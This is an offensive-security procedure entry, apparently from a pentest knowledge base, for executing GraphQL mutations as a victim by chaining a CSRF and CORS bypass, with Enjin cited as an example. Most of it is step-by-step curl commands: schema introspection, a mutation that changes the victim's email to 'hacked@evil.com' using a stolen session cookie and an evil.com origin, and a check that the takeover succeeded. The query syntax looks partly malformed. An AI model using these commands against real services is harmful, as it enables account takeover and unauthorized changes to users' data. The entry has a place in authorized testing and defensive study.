---
id: proc-998457-unauthorized-execution
tags:
  - unauthorized-access
  - account-takeover
  - graphql
type: procedure
tools: []
tactics:
  - '[[Lateral Movement]]'
commands:
  - '[[commands/curl-graphql-mutation]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Valid Accounts]]'
updated_at: '2025-12-14T17:31:42.842Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Lateral Movement]]'
mitre_techniques:
  - '[[Valid Accounts]]'
---
# Execute-Unauthorized-Actions-as-Victim

## Summary

This procedure demonstrates executing sensitive GraphQL mutations on behalf of a victim by chaining CSRF bypass and CORS exploitation, resulting in improper access control and potential account compromise.

## Description

Once CSRF and CORS are bypassed, attackers can run mutations like email changes or asset transfers using the victim's session. In Enjin, this led to unauthorized actions without proper checks. Requires prior steps for request initiation; outcomes include data exfiltration or modification, mimicking account takeover.

## Requirements

1. Successful CSRF bypass and CORS leverage from prior procedures
2. Specific GraphQL mutation queries for high-impact actions
3. Victim's active session
4. Ability to observe post-execution changes

## Defense

Defensive measures and detection strategies:

- Enforce authentication re-validation for sensitive mutations
- Rate-limit GraphQL queries per user session
- Audit logs for anomalous mutations (e.g., from unexpected IPs)
- Implement multi-factor approval for account changes

## Objectives

1. Perform state-changing actions without victim consent
2. Achieve account takeover effects via API abuse
3. Validate the full impact of access control flaws

## Instructions

### Step 1: Select Target Mutation

**Context**: Identify a high-impact GraphQL mutation from schema.

Use introspection:
```bash
curl -X GET "https://target.com/graphql?query={__schema{mutationType{fields{name}}}}
```

> List mutations like updateUser or transferAsset.

### Step 2: Execute Chained Mutation

**Context**: Send the malicious GET request with credentials.

**Command** ([[commands/curl-graphql-mutation]]):
```bash
curl -X GET "https://target.com/graphql?query={mutation{updateUser(input:{email:\"hacked@evil.com\"})}{success}}" -H "Cookie: session=victim_session" -H "Origin: https://evil.com" -v
```

> Expect {"data":{"updateUser":{"success":true}}}. CORS and CSRF bypass enable this.

### Step 3: Verify Impact

**Context**: Check victim's account for changes.

Login as victim or query status:
```bash
curl -X GET "https://target.com/graphql?query={user{id email}}" -H "Cookie: session=victim_session"
```

> Confirm email updated to attacker value.

## MITRE ATT&CK Mapping

### Tactics

- [[Lateral Movement]] Lateral Movement

### Techniques

- [[Valid Accounts]] Valid Accounts

### Sub-Techniques


## Commands Used

- [[commands/curl-graphql-mutation]]

## Tools Used


## Tags

- [[unauthorized-access]]
- [[account-takeover]]
- [[graphql]]
